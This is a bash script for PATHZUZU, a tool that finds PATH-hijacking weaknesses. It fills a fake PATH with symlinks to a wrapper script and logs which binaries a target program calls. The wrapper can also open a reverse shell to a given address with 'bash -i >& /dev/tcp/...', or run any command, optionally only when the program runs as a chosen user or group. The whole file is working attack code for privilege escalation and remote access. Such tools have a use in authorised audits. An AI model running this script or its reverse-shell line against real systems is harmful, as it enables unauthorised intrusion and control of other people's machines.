#!/usr/bin/env bash
#+-----------+
#|PA(TH)ZUZU!|
#+-v1.6.2----+------+
#|Brought to you by:|
#| Shotokan@aitch.me|
#+-PGP-AHEAD--------+----------+
#|https://keybase.io/ShotokanZH|
#+-$BEGIN----------------------+

#color definition
export def=$(echo -en "\e[1;32m");	#used for definitions, bold green
export und=$(echo -en "\e[1;4;31m");	#used for important things, bold, underlined, red
export res=$(echo -en "\e[0m");	#reset

echo -en "${res}${def}";
cat << EOF

 __      /___    \ ___    ___
|__) /\ (  | |__| ) _//  \ _//  \|
|   /--\ \ | |  |/ /__\__//__\__/. v1.6.2

EOF
echo -en "${res}";

ip="";
port="";
exe="";
t_gid="";
t_uid="";
timeout="";

err=0;
OPTIND=1;
while getopts 'e:g:r:t:u:' opt;
do
	case "$opt" in
		e)	#execute command
			exe="$OPTARG";
			;;
		g)	#gid
			t_gid="$(echo "$OPTARG" | grep -aoP '^\d+$')";
			if [ "$t_gid" == "" ];
			then
				echo "Invalid -g [required ${def}p_int${res}]" >&2;
				err=1;
			fi;
			;;
		r)	#reverse shell
			ip="$(echo "$OPTARG" | cut -d ':' -f 1 | grep -aoP '^[a-zA-Z0-9._-]+$')";
			port="$(echo "$OPTARG" | cut -d ':' -f 2 | grep -aoP '^\d+$')";
			if [ "$ip" == "" ] || [ "$port" == "" ];
			then
				echo "Invalid -r [required ${def}/^[a-zA-Z0-9._-]+:\d+\$/${res} ]" >&2;
				ip="";
				port="";
				err=1;
			fi;
			;;
		t)	#timeout
			timeout="$(echo "$OPTARG" | grep -aoP '^\d+$')";
			if [ "$timeout" == "" ];
			then
				echo "Invalid -t [required ${def}p_int${res}]" >&2;
				err=1;
			fi;
			;;
		u)	#uid
			t_uid="$(echo "$OPTARG" | grep -aoP '^\d+$')";
			if [ "$t_uid" == "" ];
			then
				echo "Invalid -u [required ${def}p_int${res}]" >&2;
				err=1;
			fi;
			;;
	esac;
done;
shift "$((OPTIND-1))";

[ $err -eq 1 ] && echo "";

tor="$(which "$1")";
log="$(basename "$0").log"

if [ "$tor" = "" ];
then
	echo "Usage: $(basename "$0") [-e command] [-r address:port] [-t seconds] command [args]";
	echo -e "\t-e command\t\e${und}E${res}xecute command if target is vulnerable";
	echo -e "\t-r address:port\tStarts ${und}r${res}everse shell to address:port";
	echo -e "\t-t seconds\t${und}T${res}imeout. Kills target after \$seconds seconds";
	echo "";
	echo "Extra flags, requiring -e or -r:";
	echo -e "\t-g gid\tRun command/r.shell only if the ${und}g${res}roup is \$gid";
	echo -e "\t-u uid\tRun command/r.shell only if the ${und}u${res}ser is \$uid";
	echo "";
	echo "Note: SUID files can bypass the -t flag, ${und}it's not a kill-proof solution."
	echo "Process may hang because of that.${res}";
	echo "";
	exit 1;
fi;

trap '' 2;

rm -rf "$log" 2>/dev/null;

echo "$(dirname "$tor")" | grep "^\." >/dev/null;
if [ $? -eq 0 ];
then
	tor="$PWD/$tor";
fi;

startd="$PWD";
ex_ugid="";

if [ "$t_uid" != "" ];
then
	ex_ugid="[ \"\$(id -u)\" == \"$t_uid\" ] && ";
fi;

if [ "$t_gid" != "" ];
then
	ex_ugid="${ex_ugid}[ \"\$(id -g)\" == \"$t_uid\" ] && ";
fi;

tmpd=$(mktemp -d);
tmpf=$(mktemp);

echo "#!$(which bash)" > $tmpf;
echo "PATH=\"${PATH}\"" >> $tmpf;
echo "echo \"\$(whoami)#\$(id -u):$(id -g) RUN: \$(basename \"\$0\") \$@\" >> $startd/$log" >> $tmpf;

if [ "$ip" != "" ] && [ "$port" != "" ];
then
	echo "if ${ex_ugid} mkdir /dev/shm/pathzuzu_rev_lock 2>/dev/null;" >> $tmpf;
	echo "then" >> $tmpf;
	echo -e "\tchown $(whoami):$(whoami) /dev/shm/pathzuzu_rev_lock;" >> $tmpf;
	echo -e "\tbash -i >& /dev/tcp/$ip/$port 0>&1 &" >> $tmpf;
	echo "fi;" >> $tmpf;
fi;
if [ "$exe" != "" ];
then
	echo "if ${ex_ugid} mkdir /dev/shm/pathzuzu_exe_lock 2>/dev/null;" >> $tmpf;
	echo "then" >> $tmpf;
	echo -e "\tchown $(whoami):$(whoami) /dev/shm/pathzuzu_exe_lock;" >> $tmpf;
	echo -e "\t( $exe ) &" >> $tmpf;
	echo "fi;" >> $tmpf;
fi;
echo "\$(basename \"\$0\") \$@" >> $tmpf;

chmod +x "$tmpf";

OIFS=$IFS;
IFS=':';
echo "Lemme do evil things:";
for p in $PATH;
do
	IFS=$'\n';
	list=$(ls "$p" 2>/dev/null);
	if [ $? -eq 0 ];
	then
		echo -en "\r\033[K\t${def}OK ($p)${res}";
		for soft in $list;
		do
			ln -s "$tmpf" "$tmpd/$soft" 2>/dev/null;
		done;
	else
		echo -e "\r\033[K\t${und}NOPE ($p)${res}";
	fi;
	IFS=':';
done;
IFS=$OIFS;

echo "";

shift;

rm -rf "/dev/shm/pathzuzu_rev_lock" 2>/dev/null;
rm -rf "/dev/shm/pathzuzu_exe_lock" 2>/dev/null;

echo "Running: ${def}$tor $@${res}";
echo "";

function printline(){
	local maxl=$(tput cols);
	maxl=$(( maxl - 8 ));
	local med=$(( maxl / 2 ));
	local x=0;

	echo -n "${def}";
	while [ $x -lt $maxl ];
	do
		if [ $x -eq $med ];
		then
			echo -n "PATHZUZU";
		fi;
		echo -n "=";
		x=$(( x + 1 ));
	done;
	echo "${res}";
}

printline;

if [ "$timeout" ==  "" ];
then
	PATH="$tmpd" "$tor" $@;
else
	function timeout(){	#yeah it's a trick. but it works. kind of.
		maxt=$1;
		command="$2";
		arg="$3";
		bash -c "PID=\$\$;((trap '' PIPE;sleep $maxt; kill -s PIPE \$(ps --ppid \$PID | grep -avP \"\skill\$\" | grep -oP \"^\s*\K\d+\") &>/dev/null; sleep 5; kill -s KILL \$(ps --ppid \$PID | grep -avP \"\skill\$\" | grep -oP \"^\s*\K\d+\") &>/dev/null )& ) | (PATH='$tmpd' '$command' $arg )";
	}
	timeout $timeout "$tor" "$@";
fi;

rm -rf "$tmpd";
rm -rf "$tmpf";
rm -rf "/dev/shm/pathzuzu_rev_lock" 2>/dev/null;
rm -rf "/dev/shm/pathzuzu_exe_lock" 2>/dev/null;

echo "";
printline;
echo "";

trap 2;

if [ -f "$log" ];
then
	echo "Done! printing ${def}$log${res}:";
	echo "";
	cat "$log";
	exit 0;
else
	echo "Done, but nothing found..";
	exit 1;
fi;
